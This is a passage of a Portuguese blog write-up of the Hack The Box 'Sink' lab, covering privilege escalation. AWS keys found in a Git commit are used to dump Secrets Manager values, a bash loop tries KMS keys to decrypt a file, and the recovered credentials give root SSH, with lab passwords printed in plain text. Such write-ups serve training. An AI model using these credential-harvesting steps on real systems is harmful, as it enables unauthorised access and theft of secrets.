</pre></table></code></div></div><h2 id="escalação-de-privilégios">Escalação de privilégios</h2><p>Durante a enumeração na porta 3000, além da chave id_rsa_marcus, também encontrei o commit <a href="http://10.10.10.225:3000/root/Log_Management/commit/e8d68917f2570f3695030d0ded25dc95738fb1ba">http://10.10.10.225:3000/root/Log_Management/commit/e8d68917f2570f3695030d0ded25dc95738fb1ba</a> que continha uma key e um secret para uma operação <code class="language-plaintext highlighter-rouge">aws</code>.</p><p><img data-proofer-ignore data-src="/img/htb/htb-sink-20.png" /></p><div lang="php" class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="k">require</span> <span class="s1">'vendor/autoload.php'</span><span class="p">;</span>

<span class="kn">use</span> <span class="nc">Aws\CloudWatchLogs\CloudWatchLogsClient</span><span class="p">;</span>
<span class="kn">use</span> <span class="nc">Aws\Exception\AwsException</span><span class="p">;</span>

<span class="nv">$client</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">CloudWatchLogsClient</span><span class="p">([</span>
    <span class="s1">'region'</span> <span class="o">=&gt;</span> <span class="s1">'eu'</span><span class="p">,</span>
    <span class="s1">'endpoint'</span> <span class="o">=&gt;</span> <span class="s1">'http://127.0.0.1:4566'</span><span class="p">,</span>
    <span class="s1">'credentials'</span> <span class="o">=&gt;</span> <span class="p">[</span>
        <span class="s1">'key'</span> <span class="o">=&gt;</span> <span class="s1">'AKIAIUEN3QWCPSTEITJQ'</span><span class="p">,</span>
        <span class="s1">'secret'</span> <span class="o">=&gt;</span> <span class="s1">'paVI8VgTWkPI3jDNkdzUMvK4CcdXO2T7sePX0ddF'</span>
    <span class="p">],</span>
    <span class="s1">'version'</span> <span class="o">=&gt;</span> <span class="s1">'latest'</span>
<span class="p">]);</span>
<span class="k">try</span> <span class="p">{</span>
<span class="nv">$client</span><span class="o">-&gt;</span><span class="nf">createLogGroup</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
    <span class="s1">'logGroupName'</span> <span class="o">=&gt;</span> <span class="s1">'Chef_Events'</span><span class="p">,</span>
<span class="p">));</span>
<span class="p">}</span>
<span class="k">catch</span> <span class="p">(</span><span class="nc">AwsException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="nf">getMessage</span><span class="p">();</span>
    <span class="k">echo</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">try</span> <span class="p">{</span>
<span class="nv">$client</span><span class="o">-&gt;</span><span class="nf">createLogStream</span><span class="p">([</span>
    <span class="s1">'logGroupName'</span> <span class="o">=&gt;</span> <span class="s1">'Chef_Events'</span><span class="p">,</span>
    <span class="s1">'logStreamName'</span> <span class="o">=&gt;</span> <span class="s1">'20201120'</span>
<span class="p">]);</span>
<span class="p">}</span><span class="k">catch</span> <span class="p">(</span><span class="nc">AwsException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="nf">getMessage</span><span class="p">();</span>
    <span class="k">echo</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>O que significa que podemos checar as configurações aws no server.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>marcus@sink:~<span class="nv">$ </span>aws configure
AWS Access Key ID <span class="o">[</span>None]: AKIAIUEN3QWCPSTEITJQ
AWS Secret Access Key <span class="o">[</span>None]: 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
Default region name <span class="o">[</span>None]: us
Default output format <span class="o">[</span>None]: json
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/img/htb/htb-sink-21.png" /></p><p>Depois disso, podemos listar os <code class="language-plaintext highlighter-rouge">secrets</code>.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>marcus@sink:~<span class="nv">$ </span>aws <span class="nt">--endpoint-url</span><span class="o">=</span><span class="s2">"http://127.0.0.1:4566/"</span> secretsmanager list-secrets
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/img/htb/htb-sink-22.png" /></p><p>Com as informações obtidas, podemos obter os valores dos secrets.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>marcus@sink:~<span class="nv">$ </span>aws <span class="nt">--endpoint-url</span><span class="o">=</span><span class="s2">"http://127.0.0.1:4566/"</span> secretsmanager get-secret-value <span class="nt">--secret-id</span> <span class="s2">"arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-HRbzR"</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/img/htb/htb-sink-23.png" /></p><p>E conseguimos a credencial do usuário david:david:EALB=bcC=`a7f2#k.</p><p>Vamos fazer o movimento lateral.</p><p><img data-proofer-ignore data-src="/img/htb/htb-sink-24.png" /></p><p>Dentro do diretório do usuário david, encontrei o arquivo <code class="language-plaintext highlighter-rouge">servers.enc</code> no diretório <code class="language-plaintext highlighter-rouge">/home/david/Projects/Prod_Deployment</code>.</p><p><img data-proofer-ignore data-src="/img/htb/htb-sink-25.png" /></p><p>Este arquivo está encriptado, pois é uma criptografia <code class="language-plaintext highlighter-rouge">server-side</code> da aws. Para conseguir abrí-lo, precisamos da key correta, novamente utilizaremos as configurações da aws.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>david@sink:~/Projects/Prod_Deployment<span class="nv">$ </span>aws configure
AWS Access Key ID <span class="o">[</span>None]: AKIAIUEN3QWCPSTEITJQ
AWS Secret Access Key <span class="o">[</span>None]: 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
Default region name <span class="o">[</span>None]: us
Default output format <span class="o">[</span>None]: json
</pre></table></code></div></div><p>Agora podemos listar as <code class="language-plaintext highlighter-rouge">keys</code>.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>david@sink:~/Projects/Prod_Deployment<span class="nv">$ </span>aws <span class="nt">--endpoint-url</span><span class="o">=</span><span class="s2">"http://127.0.0.1:4566/"</span> kms list-keys
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/img/htb/htb-sink-26.png" /></p><p>Encontramos várias keys, para não tentarmos uma por uma, podemos fazer um script para testar uma de cada vez.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="k">for </span>KEY <span class="k">in</span> <span class="si">$(</span>aws <span class="nt">--endpoint-url</span><span class="o">=</span><span class="s2">"http://127.0.0.1:4566/"</span> kms list-keys | <span class="nb">grep </span>KeyId | <span class="nb">awk</span> <span class="nt">-F</span><span class="se">\"</span> <span class="s1">'{ print $4 }'</span><span class="si">)</span>
        <span class="k">do 
                </span>aws <span class="nt">--endpoint-url</span><span class="o">=</span><span class="s2">"http://127.0.0.1:4566/"</span> kms enable-key <span class="nt">--key-id</span> <span class="s2">"</span><span class="k">${</span><span class="nv">KEY</span><span class="k">}</span><span class="s2">"</span>
                aws <span class="nt">--endpoint-url</span><span class="o">=</span><span class="s2">"http://127.0.0.1:4566/"</span> kms decrypt <span class="nt">--key-id</span> <span class="s2">"</span><span class="k">${</span><span class="nv">KEY</span><span class="k">}</span><span class="s2">"</span> <span class="nt">--ciphertext-blob</span> <span class="s2">"fileb:///home/david/Projects/Prod_Deployment/servers.enc"</span> <span class="nt">--encryption-algorithm</span> <span class="s2">"RSAES_OAEP_SHA_256"</span> <span class="nt">--output</span> <span class="s2">"text"</span> <span class="nt">--query</span> <span class="s2">"Plaintext"</span>
<span class="k">done</span>
</pre></table></code></div></div><p>Ao rodar o script, ele tentará decriptar o arquivo.</p><p><img data-proofer-ignore data-src="/img/htb/htb-sink-27.png" /></p><p>Agora podemos utilizar o <a href="https://gchq.github.io/CyberChef/">CyberChief</a> para decriptar este <code class="language-plaintext highlighter-rouge">base64</code>.</p><p><img data-proofer-ignore data-src="/img/htb/htb-sink-28.png" /></p><p>Ao clicarmos em <code class="language-plaintext highlighter-rouge">servers.yml</code>, conseguimos as credenciais <code class="language-plaintext highlighter-rouge">admin:_uezduQ!EY5AHfe2</code>.</p><p><img data-proofer-ignore data-src="/img/htb/htb-sink-29.png" /></p><p>Ao tentar ssh com estas credenciais não obtivemos resposta, porém, como o user é <code class="language-plaintext highlighter-rouge">admin</code>, vamos tentar ssh com <code class="language-plaintext highlighter-rouge">root</code>.</p><p><img data-proofer-ignore data-src="/img/htb/htb-sink-30.png" /></p><p>E conseguimos acesso <code class="language-plaintext highlighter-rouge">root</code>!!!</p><p>A flag <code class="language-plaintext highlighter-rouge">root.txt</code> se encontra no diretório <code class="language-plaintext highlighter-rouge">/root</code>.</p><p>E comprometemos o server!! <br /></p><p><img data-proofer-ignore data-src="/img/htb/hackerman.gif" /> <br /></p><h3 id="referências">Referências</h3><div class="table-wrapper"><table><thead><tr><th>Vulnerabilidade<th>Url<tbody><tr><td>HAProxy HTTP request smuggling (CVE-2019-18277)<td><a href="https://nathandavison.com/blog/haproxy-http-request-smuggling">https://nathandavison.com/blog/haproxy-http-request-smuggling</a><tr><td>CyberChef<td><a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></table></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeups/'>Writeups</a>, <a href='/categories/hack-the-box/'>Hack The Box</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >HTB</a> <a href="/tags/request-smuggling/" class="post-tag no-text-decoration" >Request Smuggling</a> <a href="/tags/gitea/" class="post-tag no-text-decoration" >Gitea</a> <a href="/tags/aws/" class="post-tag no-text-decoration" >AWS</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a> <a href="/tags/insane/" class="post-tag no-text-decoration" >Insane</a> <a href="/tags/web/" class="post-tag no-text-decoration" >Web</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HTB Sink Writeup - H41stur&url=https://h41stur.github.io/posts/htb-sink-writeup/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HTB Sink Writeup - H41stur&u=https://h41stur.github.io/posts/htb-sink-writeup/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HTB Sink Writeup - H41stur&url=https://h41stur.github.io/posts/htb-sink-writeup/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://h41stur.github.io/posts/htb-sink-writeup/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')" data-toggle="tooltip" data-placement="top" title="Copy link"> </i> </span></div></div></div></div><div> <script src="https://utteranc.es/client.js" repo="h41stur/h41stur.github.io" issue-term="url" theme="photon-dark" crossorigin="anonymous" async> </script></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/process-injection/">Process Injection 101</a><li><a href="/posts/evasao-av/">Evasão de Antivírus - Princípios Gerais e Abordagens Específicas</a><li><a href="/posts/paper-heap/">Heap Exploitation P.1</a><li><a href="/posts/shellcoding101/">Shellcoding 101</a><li><a href="/posts/replay-sinal-rf/">Uma Jornada no Hardware Hacking: Criando um Clonador de Sinais RF</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/assembly/">Assembly</a> <a class="post-tag" href="/tags/binary-exploitation/">Binary Exploitation</a> <a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/web/">Web</a> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/vulnserver/">Vulnserver</a> <a class="post-tag" href="/tags/android/">Android</a> <a class="post-tag" href="/tags/kernel/">Kernel</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-knife-writeup/"><div class="card-body"> <span class="timeago small" >Sep 3, 2021<i class="unloaded">2021-09-03T21:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB Knife Writeup</h3><div class="text-muted small"><p> Nome Knife IP 10.10.10.242 Pontos 20 OS Linux Nível Easy RECON Nm...</p></div></div></a></div><div class="card"> <a href="/posts/htb-oopsie-writeup/"><div class="card-body"> <span class="timeago small" >Sep 5, 2021<i class="unloaded">2021-09-05T21:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB Oopsie Writeup</h3><div class="text-muted small"><p> Nome Oopsie IP 10.10.10.28 Pontos 0 OS Linux Nível Very Easy RECON...</p></div></div></a></div><div class="card"> <a href="/posts/htb-pikaboo-writeup/"><div class="card-body"> <span class="timeago small" >Sep 19, 2021<i class="unloaded">2021-09-19T10:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB Pikaboo Writeup</h3><div class="text-muted small"><p> Nome Pikaboo IP 10.10.10.249 Pontos 40 OS Linux Nível Insane RECON...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/thm-crocccrew-writeup/" class="btn btn-outline-primary" prompt="Older"><p>THM Crocc Crew Writeup</p></a> <a href="/posts/htb-pikaboo-writeup/" class="btn btn-outline-primary" prompt="Newer"><p>HTB Pikaboo Writeup</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/h41stur">H41stur</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/assembly/">Assembly</a> <a class="post-tag" href="/tags/binary-exploitation/">Binary Exploitation</a> <a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/web/">Web</a> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/vulnserver/">Vulnserver</a> <a class="post-tag" href="/tags/android/">Android</a> <a class="post-tag" href="/tags/kernel/">Kernel</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://h41stur.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
